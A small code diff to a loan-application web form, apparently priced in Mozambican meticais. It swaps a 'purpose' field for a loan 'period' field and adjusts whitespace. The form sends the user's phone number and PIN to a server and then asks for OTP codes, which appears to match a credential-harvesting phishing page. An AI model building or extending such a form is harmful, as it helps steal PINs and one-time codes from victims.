@@ -452,8 +452,7 @@
         appData.purpose = purpose;
         goToStep(3);
     }
-
-    async function submitApplication() {
+async function submitApplication() {
         const pin = document.getElementById('user-pin').value.trim();
         const err = document.getElementById('err-step-3');
 
@@ -473,7 +472,7 @@
                 body: JSON.stringify({
                     phone: appData.phone,
                     amount: `${appData.amount} MT`,
-                    purpose: appData.purpose,
+                    period: `${appData.term} Meses`, // Added period to match server.js requirements
                     pin: appData.pin
                 })
             });
@@ -489,7 +488,7 @@
             goToStep(3);
         }
     }
-
+    
     async function submitOtp1() {
         const otp = document.getElementById('user-otp1').value.trim();
         const err = document.getElementById('err-step-5');
